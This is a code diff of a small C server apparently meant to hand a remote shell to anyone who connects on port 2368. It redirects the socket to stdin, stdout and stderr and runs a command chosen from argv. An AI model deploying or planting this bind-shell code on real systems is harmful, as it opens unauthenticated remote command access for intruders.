@@ -15,21 +15,32 @@
 #include "../lib/simple-socket/server.h"
 
 int serverFd;
+char *cmd;
 
 void shell_exec(int fd) {
+    
     dup2(fd, STDOUT_FILENO);
     dup2(fd, STDIN_FILENO);
+    dup2(fd, STDERR_FILENO);
+
     close(fd);
 
-    system("sh");
+    system(cmd);
 }
 
 int main(int argc, char **argv) {
     int port;
 
-    if (argc > 1) {
+    if (argc == 2) {
+        cmd = argv[1];
+        port = 2368;
+    }
+    else if (argc == 3) {
         port = atoi(argv[1]);
-    } else {
+        cmd = argv[2];
+    }
+    else {
+        cmd = "./shell";
         port = 2368;
     }
 
